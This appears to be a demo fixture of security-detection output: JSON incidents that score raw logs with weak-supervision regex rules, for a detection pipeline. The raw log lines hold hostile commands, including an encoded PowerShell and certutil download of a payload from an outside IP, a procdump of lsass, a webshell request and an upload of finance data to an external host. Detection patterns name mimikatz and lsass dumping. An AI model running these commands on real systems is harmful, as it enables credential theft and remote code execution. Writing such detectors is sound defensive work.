@@ -1,0 +1,441 @@
+[
+  {
+    "id": "WIN-F96EFC3EC25A",
+    "title": "Execution / Credential Access",
+    "severity": "critical",
+    "score": 0.94644,
+    "start": "2026-08-09T02:14:00Z",
+    "end": "2026-08-09T02:21:00Z",
+    "status": "new",
+    "eventCount": 3,
+    "entities": [
+      "HOST-07",
+      "alice",
+      "198.51.100.8",
+      "powershell.exe",
+      "a.ps1",
+      "certutil.exe",
+      "payload.exe",
+      "procdump.exe",
+      "lsass.exe"
+    ],
+    "hosts": [
+      "HOST-07"
+    ],
+    "sourceTypes": [
+      "ETW",
+      "Syslog"
+    ],
+    "summary": "由 3 条真实日志聚合；弱监督命中 3 条，保留原始行号用于溯源。",
+    "events": [
+      {
+        "id": "EVT-005",
+        "event_id": "EVT-005",
+        "timestamp": "2026-08-09T02:14:00Z",
+        "time": "2026-08-09T02:14:00Z",
+        "action": "Execution",
+        "source": "ETW",
+        "source_type": "ETW",
+        "raw": "host=HOST-07 user=alice powershell.exe -EncodedCommand SQBFAFgA download http://198.51.100.8/a.ps1",
+        "text": "host=HOST-07 user=alice powershell.exe -EncodedCommand SQBFAFgA download http://198.51.100.8/a.ps1",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:5",
+        "entities": [
+          "HOST-07",
+          "alice",
+          "198.51.100.8",
+          "powershell.exe",
+          "a.ps1"
+        ],
+        "confidence": 0.87644,
+        "risk_score": 0.87644,
+        "anomaly_score": 0.756421,
+        "weak_score": 0.95,
+        "weak_rules": [
+          {
+            "rule_id": "WS-PS-ENCODED",
+            "pattern": "powershell.*(?:-enc|-encodedcommand|frombase64string)",
+            "weight": 0.95,
+            "tactic": "Execution",
+            "reason": "编码 PowerShell 命令",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Execution"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.7071067811865475,
+          "source_rarity": 0.4082482904638631,
+          "length_deviation": 1.0,
+          "off_hours": 1.0
+        }
+      },
+      {
+        "id": "EVT-006",
+        "event_id": "EVT-006",
+        "timestamp": "2026-08-09T02:17:00Z",
+        "time": "2026-08-09T02:17:00Z",
+        "action": "Execution",
+        "source": "Syslog",
+        "source_type": "Syslog",
+        "raw": "host=HOST-07 user=alice certutil -urlcache http://198.51.100.8/payload.exe payload.exe",
+        "text": "host=HOST-07 user=alice certutil -urlcache http://198.51.100.8/payload.exe payload.exe",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:6",
+        "entities": [
+          "HOST-07",
+          "alice",
+          "198.51.100.8",
+          "certutil.exe",
+          "payload.exe"
+        ],
+        "confidence": 0.813176,
+        "risk_score": 0.813176,
+        "anomaly_score": 0.704149,
+        "weak_score": 0.88,
+        "weak_rules": [
+          {
+            "rule_id": "WS-LOLBIN",
+            "pattern": "(?:certutil|bitsadmin|rundll32|regsvr32).*(?:http|download|urlcache)",
+            "weight": 0.88,
+            "tactic": "Execution",
+            "reason": "系统工具下载或代理执行",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Execution"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.7071067811865475,
+          "source_rarity": 0.4082482904638631,
+          "length_deviation": 0.6515151515151515,
+          "off_hours": 1.0
+        }
+      },
+      {
+        "id": "EVT-007",
+        "event_id": "EVT-007",
+        "timestamp": "2026-08-09T02:21:00Z",
+        "time": "2026-08-09T02:21:00Z",
+        "action": "Credential Access",
+        "source": "ETW",
+        "source_type": "ETW",
+        "raw": "host=HOST-07 user=alice procdump.exe -ma lsass.exe lsass.dmp",
+        "text": "host=HOST-07 user=alice procdump.exe -ma lsass.exe lsass.dmp",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:7",
+        "entities": [
+          "HOST-07",
+          "alice",
+          "procdump.exe",
+          "lsass.exe"
+        ],
+        "confidence": 0.845813,
+        "risk_score": 0.845813,
+        "anomaly_score": 0.626876,
+        "weak_score": 0.98,
+        "weak_rules": [
+          {
+            "rule_id": "WS-CREDENTIAL-DUMP",
+            "pattern": "(?:mimikatz|sekurlsa|lsass.*(?:dump|access)|procdump.*lsass)",
+            "weight": 0.98,
+            "tactic": "Credential Access",
+            "reason": "凭据转储行为",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Credential Access"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.7071067811865475,
+          "source_rarity": 0.4082482904638631,
+          "length_deviation": 0.13636363636363635,
+          "off_hours": 1.0
+        }
+      }
+    ],
+    "weak_supervision": {
+      "rule_hits": 3,
+      "tactics": [
+        "Execution",
+        "Credential Access"
+      ]
+    },
+    "provenance": [
+      "data\\demo\\real_logs.jsonl:5",
+      "data\\demo\\real_logs.jsonl:6",
+      "data\\demo\\real_logs.jsonl:7"
+    ]
+  },
+  {
+    "id": "WIN-16B47A1C6CC4",
+    "title": "Command and Control",
+    "severity": "high",
+    "score": 0.798384,
+    "start": "2026-08-09T04:10:00Z",
+    "end": "2026-08-09T04:10:00Z",
+    "status": "new",
+    "eventCount": 1,
+    "entities": [
+      "HOST-07",
+      "alice",
+      "akdjfhqowieurytpxmcnvbals.evil.example"
+    ],
+    "hosts": [
+      "HOST-07"
+    ],
+    "sourceTypes": [
+      "DNS"
+    ],
+    "summary": "由 1 条真实日志聚合；弱监督命中 1 条，保留原始行号用于溯源。",
+    "events": [
+      {
+        "id": "EVT-008",
+        "event_id": "EVT-008",
+        "timestamp": "2026-08-09T04:10:00Z",
+        "time": "2026-08-09T04:10:00Z",
+        "action": "Command and Control",
+        "source": "DNS",
+        "source_type": "DNS",
+        "raw": "host=HOST-07 user=alice query=akdjfhqowieurytpxmcnvbals.evil.example result=NOERROR",
+        "text": "host=HOST-07 user=alice query=akdjfhqowieurytpxmcnvbals.evil.example result=NOERROR",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:8",
+        "entities": [
+          "HOST-07",
+          "alice",
+          "akdjfhqowieurytpxmcnvbals.evil.example"
+        ],
+        "confidence": 0.798384,
+        "risk_score": 0.798384,
+        "anomaly_score": 0.697852,
+        "weak_score": 0.86,
+        "weak_rules": [
+          {
+            "rule_id": "WS-DNS-TUNNEL",
+            "pattern": "(?:query|qname)[=: ]+[a-z0-9]{24,}\\.[a-z0-9.-]+",
+            "weight": 0.86,
+            "tactic": "Command and Control",
+            "reason": "高熵长子域查询",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Command and Control"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.7071067811865475,
+          "source_rarity": 0.5,
+          "length_deviation": 0.5606060606060606,
+          "off_hours": 1.0
+        }
+      }
+    ],
+    "weak_supervision": {
+      "rule_hits": 1,
+      "tactics": [
+        "Command and Control"
+      ]
+    },
+    "provenance": [
+      "data\\demo\\real_logs.jsonl:8"
+    ]
+  },
+  {
+    "id": "WIN-304D6FB35B07",
+    "title": "Persistence / Exfiltration",
+    "severity": "high",
+    "score": 0.824809,
+    "start": "2026-08-09T09:30:00Z",
+    "end": "2026-08-09T09:34:00Z",
+    "status": "new",
+    "eventCount": 2,
+    "entities": [
+      "WEB-01",
+      "www-data",
+      "203.0.113.9",
+      "shell.php"
+    ],
+    "hosts": [
+      "WEB-01"
+    ],
+    "sourceTypes": [
+      "WAF",
+      "Syslog"
+    ],
+    "summary": "由 2 条真实日志聚合；弱监督命中 2 条，保留原始行号用于溯源。",
+    "events": [
+      {
+        "id": "EVT-011",
+        "event_id": "EVT-011",
+        "timestamp": "2026-08-09T09:30:00Z",
+        "time": "2026-08-09T09:30:00Z",
+        "action": "Persistence",
+        "source": "WAF",
+        "source_type": "WAF",
+        "raw": "host=WEB-01 uri=/shell.php?cmd=whoami status=200 user=www-data /bin/sh",
+        "text": "host=WEB-01 uri=/shell.php?cmd=whoami status=200 user=www-data /bin/sh",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:11",
+        "entities": [
+          "WEB-01",
+          "www-data",
+          "203.0.113.9",
+          "shell.php"
+        ],
+        "confidence": 0.775129,
+        "risk_score": 0.775129,
+        "anomaly_score": 0.538762,
+        "weak_score": 0.92,
+        "weak_rules": [
+          {
+            "rule_id": "WS-WEBSHELL",
+            "pattern": "(?:cmd=|shell\\.php|/bin/sh|whoami).*(?:http|waf|uri|status)",
+            "weight": 0.92,
+            "tactic": "Persistence",
+            "reason": "疑似 WebShell 命令执行",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Persistence"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.7071067811865475,
+          "source_rarity": 0.5,
+          "length_deviation": 0.16666666666666666,
+          "off_hours": 0.0
+        }
+      },
+      {
+        "id": "EVT-012",
+        "event_id": "EVT-012",
+        "timestamp": "2026-08-09T09:34:00Z",
+        "time": "2026-08-09T09:34:00Z",
+        "action": "Exfiltration",
+        "source": "Syslog",
+        "source_type": "Syslog",
+        "raw": "host=WEB-01 user=www-data sensitive finance archive zip upload external destination=203.0.113.9",
+        "text": "host=WEB-01 user=www-data sensitive finance archive zip upload external destination=203.0.113.9",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:12",
+        "entities": [
+          "WEB-01",
+          "www-data",
+          "203.0.113.9"
+        ],
+        "confidence": 0.789809,
+        "risk_score": 0.789809,
+        "anomaly_score": 0.610024,
+        "weak_score": 0.9,
+        "weak_rules": [
+          {
+            "rule_id": "WS-SENSITIVE-EXFIL",
+            "pattern": "(?:shadow|passwd|sensitive|secret|finance).*(?:archive|zip|upload|egress|external)",
+            "weight": 0.9,
+            "tactic": "Exfiltration",
+            "reason": "敏感文件归档或外传",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Exfiltration"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.5773502691896258,
+          "source_rarity": 0.4082482904638631,
+          "length_deviation": 0.9242424242424242,
+          "off_hours": 0.0
+        }
+      }
+    ],
+    "weak_supervision": {
+      "rule_hits": 2,
+      "tactics": [
+        "Persistence",
+        "Exfiltration"
+      ]
+    },
+    "provenance": [
+      "data\\demo\\real_logs.jsonl:11",
+      "data\\demo\\real_logs.jsonl:12"
+    ]
+  },
+  {
+    "id": "WIN-F89E3B4CD323",
+    "title": "Credential Access",
+    "severity": "medium",
+    "score": 0.672227,
+    "start": "2026-08-09T10:00:00Z",
+    "end": "2026-08-09T10:00:00Z",
+    "status": "new",
+    "eventCount": 1,
+    "entities": [
+      "HOST-03",
+      "svc_backup",
+      "192.0.2.5"
+    ],
+    "hosts": [
+      "HOST-03"
+    ],
+    "sourceTypes": [
+      "ETW"
+    ],
+    "summary": "由 1 条真实日志聚合；弱监督命中 1 条，保留原始行号用于溯源。",
+    "events": [
+      {
+        "id": "EVT-013",
+        "event_id": "EVT-013",
+        "timestamp": "2026-08-09T10:00:00Z",
+        "time": "2026-08-09T10:00:00Z",
+        "action": "Credential Access",
+        "source": "ETW",
+        "source_type": "ETW",
+        "raw": "host=HOST-03 user=svc_backup failed login attempts=12 source=192.0.2.5",
+        "text": "host=HOST-03 user=svc_backup failed login attempts=12 source=192.0.2.5",
+        "raw_log_ref": "data\\demo\\real_logs.jsonl:13",
+        "entities": [
+          "HOST-03",
+          "svc_backup",
+          "192.0.2.5"
+        ],
+        "confidence": 0.672227,
+        "risk_score": 0.672227,
+        "anomaly_score": 0.496387,
+        "weak_score": 0.78,
+        "weak_rules": [
+          {
+            "rule_id": "WS-BRUTE-FORCE",
+            "pattern": "(?:failed|failure|invalid).*(?:login|logon|password).*(?:count|attempts?)[=: ]+(?:[6-9]|[1-9][0-9]+)",
+            "weight": 0.78,
+            "tactic": "Credential Access",
+            "reason": "短时认证失败聚集",
+            "source_types": []
+          }
+        ],
+        "tactics": [
+          "Credential Access"
+        ],
+        "anomaly_components": {
+          "template_rarity": 0.7071067811865475,
+          "entity_rarity": 0.5773502691896258,
+          "source_rarity": 0.4082482904638631,
+          "length_deviation": 0.16666666666666666,
+          "off_hours": 0.0
+        }
+      }
+    ],
+    "weak_supervision": {
+      "rule_hits": 1,
+      "tactics": [
+        "Credential Access"
+      ]
+    },
+    "provenance": [
+      "data\\demo\\real_logs.jsonl:13"
+    ]
+  }
+]
